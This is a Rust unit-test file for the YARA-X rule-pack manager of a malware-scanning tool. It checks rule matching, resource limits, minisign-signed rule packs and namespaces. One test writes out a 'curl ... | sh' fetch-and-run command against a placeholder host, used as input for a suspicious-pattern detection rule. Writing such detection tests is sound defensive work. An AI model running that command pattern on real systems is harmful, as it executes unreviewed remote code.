use std::fs;
use std::io::Cursor;
use std::path::PathBuf;
use std::time::Duration;

use arbitraitor_analysis::{AnalysisCoordinator, ArtifactDetector};
use arbitraitor_artifact::ArtifactType;
use arbitraitor_model::finding::FindingCategory;

use super::{
    RulePack, RulePackAuth, RulePackManager, RuleSource, YaraDetector, YaraError, YaraScanner,
    minisign_key_id, minisign_sidecar_path, select_rules_for_artifact,
};

const TEST_RULE: &str = r#"
rule Arbitraitor_Test_Malware : malware unit_test
{
  meta:
description = "test rule"
  strings:
$marker = "arbitraitor-malware-marker" ascii
  condition:
$marker
}
"#;

const SHELL_ONLY_RULE: &str = r#"
rule Shell_Only
{
  meta:
artifact_class = "shell_script"
  condition:
true
}
"#;

const UNTAGGED_RULE: &str = r"
rule Untagged_All_Artifacts
{
  condition:
true
}
";

#[test]
fn scan_with_matching_rule_produces_finding() -> Result<(), Box<dyn std::error::Error>> {
    let detector = YaraDetector::from_rules(TEST_RULE)?;
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(detector)]);

    let result = coordinator.analyze(b"prefix arbitraitor-malware-marker suffix");

    assert_eq!(result.findings.len(), 1);
    let finding = &result.findings[0];
    assert_eq!(finding.category, FindingCategory::MalwareSignature);
    assert!(finding.tags.iter().any(|tag| tag == "unit_test"));
    assert!(finding.evidence.iter().all(|evidence| {
        evidence
            .content
            .as_deref()
            .is_none_or(|content| !content.contains("arbitraitor-malware-marker"))
    }));
    assert!(finding.evidence.iter().any(|evidence| {
        evidence.content.as_deref().is_some_and(|content| {
            content.contains("matched at offset") && content.contains("length")
        })
    }));
    Ok(())
}

#[test]
fn scan_with_no_match_produces_no_findings() -> Result<(), Box<dyn std::error::Error>> {
    let detector = YaraDetector::from_rules(TEST_RULE)?;
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(detector)]);

    let result = coordinator.analyze(b"benign content");

    assert!(result.findings.is_empty());
    Ok(())
}

#[test]
fn invalid_rule_syntax_returns_error() -> Result<(), Box<dyn std::error::Error>> {
    let mut scanner = YaraScanner::empty()?;

    let error = scanner.add_rules("rule broken { condition: }");

    assert!(matches!(error, Err(YaraError::Compile(_))));
    assert!(scanner.scan(b"anything").is_empty());
    Ok(())
}

#[test]
fn resource_limit_is_enforced_as_finding() -> Result<(), Box<dyn std::error::Error>> {
    let detector = YaraDetector::from_rules(TEST_RULE)?.with_limits(Duration::from_secs(1), 4);
    let coordinator = AnalysisCoordinator::with_detectors(vec![Box::new(detector)]);

    let result = coordinator.analyze(b"longer than four bytes");

    assert_eq!(result.findings.len(), 1);
    assert_eq!(
        result.findings[0].category,
        FindingCategory::ResourceLimitEvent
    );
    Ok(())
}

#[test]
fn built_in_rules_compile_and_scan() -> Result<(), Box<dyn std::error::Error>> {
    let scanner = RulePackManager::with_built_in()?.compile_all()?;

    let matches = scanner.scan_result(b"curl https://example.test/install.sh | sh")?;

    assert!(
        matches
            .iter()
            .any(|matched| matched.rule_identifier == "Arbitraitor_Suspicious_CurlPipeShell")
    );
    assert!(scanner.rule_pack_versions().len() >= 2);
    Ok(())
}

#[test]
fn load_external_rules_from_directory() -> Result<(), Box<dyn std::error::Error>> {
    let dir = test_dir("external-rules")?;
    fs::write(dir.join("external.yar"), TEST_RULE)?;
    let mut manager = RulePackManager::new();

    manager.load_directory(&dir, RuleSource::FileSystem(dir.clone()))?;
    let scanner = manager.compile_all()?;

    assert_eq!(scanner.scan(b"arbitraitor-malware-marker").len(), 1);
    fs::remove_dir_all(dir)?;
    Ok(())
}

#[test]
fn signed_pack_with_valid_signature_loads_as_signed() -> Result<(), Box<dyn std::error::Error>> {
    let dir = test_dir("signed-valid-rules")?;
    let rule_path = dir.join("signed.yar");
    fs::write(&rule_path, TEST_RULE)?;
    let key = minisign::KeyPair::generate_unencrypted_keypair()?;
    write_minisign_sidecar(&rule_path, TEST_RULE.as_bytes(), &key)?;
    let mut manager = RulePackManager::new().with_trusted_key(key.pk.clone());

    manager.load_directory(&dir, RuleSource::FileSystem(dir.clone()))?;

    assert_eq!(manager.packs().len(), 1);
    assert_eq!(
        manager.packs()[0].auth,
        RulePackAuth::Signed {
            key_id: minisign_key_id(&key.pk)
        }
    );
    fs::remove_dir_all(dir)?;
    Ok(())
}

#[test]
fn signed_pack_with_invalid_signature_is_rejected() -> Result<(), Box<dyn std::error::Error>> {
    let dir = test_dir("signed-invalid-rules")?;
    let rule_path = dir.join("signed.yar");
    fs::write(&rule_path, TEST_RULE)?;
    let signing_key = minisign::KeyPair::generate_unencrypted_keypair()?;
    let trusted_key = minisign::KeyPair::generate_unencrypted_keypair()?;
    write_minisign_sidecar(&rule_path, TEST_RULE.as_bytes(), &signing_key)?;
    let mut manager = RulePackManager::new().with_trusted_key(trusted_key.pk.clone());

    let error = manager.load_directory(&dir, RuleSource::FileSystem(dir.clone()));

    assert!(matches!(error, Err(YaraError::Auth(_))));
    fs::remove_dir_all(dir)?;
    Ok(())
}

#[test]
fn unsigned_pack_loads_as_user_local_unsigned() -> Result<(), Box<dyn std::error::Error>> {
    let dir = test_dir("unsigned-rules")?;
    fs::write(dir.join("external.yar"), TEST_RULE)?;
    let mut manager = RulePackManager::new();

    manager.load_directory(&dir, RuleSource::FileSystem(dir.clone()))?;

    assert_eq!(manager.packs().len(), 1);
    assert!(matches!(
        &manager.packs()[0].auth,
        RulePackAuth::Unsigned { reason } if reason.contains("user-local")
    ));
    fs::remove_dir_all(dir)?;
    Ok(())
}

#[test]
fn shell_script_rule_does_not_match_pe_artifact() -> Result<(), Box<dyn std::error::Error>> {
    let detector = YaraDetector::from_rules(SHELL_ONLY_RULE)?;
    let coordinator =
        AnalysisCoordinator::with_detectors(vec![Box::new(detector), Box::new(ArtifactDetector)]);

    let result = coordinator.analyze(b"MZ\x90\0pe-like bytes");

    assert!(result.findings.is_empty());
    Ok(())
}

#[test]
fn untagged_rule_scans_all_artifact_types() -> Result<(), Box<dyn std::error::Error>> {
    let scanner = YaraScanner::empty()?;
    let mut scanner = scanner;
    scanner.add_rules(UNTAGGED_RULE)?;

    let matches =
        scanner.scan_result_for_artifact(b"MZ\x90\0pe-like bytes", ArtifactType::PeExecutable)?;

    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].rule_identifier, "Untagged_All_Artifacts");
    Ok(())
}

#[test]
fn rule_selection_returns_only_applicable_handles() -> Result<(), Box<dyn std::error::Error>> {
    let mut scanner = YaraScanner::empty()?;
    scanner.add_rules(&format!("{SHELL_ONLY_RULE}\n{UNTAGGED_RULE}"))?;
    let rules = scanner.rules();

    let selected = select_rules_for_artifact(&rules, ArtifactType::PeExecutable);

    assert_eq!(selected.len(), 1);
    assert_eq!(selected[0].identifier, "Untagged_All_Artifacts");
    Ok(())
}

#[test]
fn multiple_namespaces_allow_duplicate_rule_names() -> Result<(), Box<dyn std::error::Error>> {
    let duplicate_rule = r#"
rule Duplicate_Rule
{
  strings:
$marker = "shared-marker" ascii
  condition:
$marker
}
"#;
    let mut manager = RulePackManager::new();
    manager.add_pack(RulePack::new(
        RuleSource::Community,
        "community",
        "1",
        duplicate_rule,
    ))?;
    manager.add_pack(RulePack::new(
        RuleSource::Enterprise,
        "enterprise",
        "2",
        duplicate_rule,
    ))?;

    let matches = manager.compile_all()?.scan_result(b"shared-marker")?;

    let namespaces: Vec<&str> = matches
        .iter()
        .map(|matched| matched.namespace.as_str())
        .collect();
    assert_eq!(namespaces, vec!["community", "enterprise"]);
    Ok(())
}

#[test]
fn invalid_rule_file_returns_error() -> Result<(), Box<dyn std::error::Error>> {
    let dir = test_dir("invalid-rules")?;
    fs::write(dir.join("broken.yar"), "rule broken { condition: }")?;
    let mut manager = RulePackManager::new();

    let error = manager.load_directory(&dir, RuleSource::FileSystem(dir.clone()));

    assert!(matches!(error, Err(YaraError::Compile(_))));
    fs::remove_dir_all(dir)?;
    Ok(())
}

#[test]
fn pack_versions_track_namespace_and_version() -> Result<(), Box<dyn std::error::Error>> {
    let mut manager = RulePackManager::new();
    manager.add_pack(RulePack::new(
        RuleSource::UserLocal,
        "local_rules",
        "2026.06.18",
        TEST_RULE,
    ))?;

    let versions = manager.pack_versions();

    assert_eq!(versions.len(), 1);
    assert_eq!(versions[0].id, "arbitraitor-yarax.rules.local_rules");
    assert_eq!(versions[0].version, "2026.06.18");
    Ok(())
}

fn test_dir(name: &str) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let dir = std::env::temp_dir().join(format!("arbitraitor-yarax-{name}-{}", std::process::id()));
    if dir.exists() {
        fs::remove_dir_all(&dir)?;
    }
    fs::create_dir_all(&dir)?;
    Ok(dir)
}

fn write_minisign_sidecar(
    rule_path: &std::path::Path,
    rules_bytes: &[u8],
    key: &minisign::KeyPair,
) -> Result<(), Box<dyn std::error::Error>> {
    let signature = minisign::sign(
        Some(&key.pk),
        &key.sk,
        Cursor::new(rules_bytes),
        Some("arbitraitor YARA-X rule pack"),
        Some("signature from arbitraitor rule-pack key"),
    )?;
    fs::write(minisign_sidecar_path(rule_path), signature.to_bytes())?;
    Ok(())
}
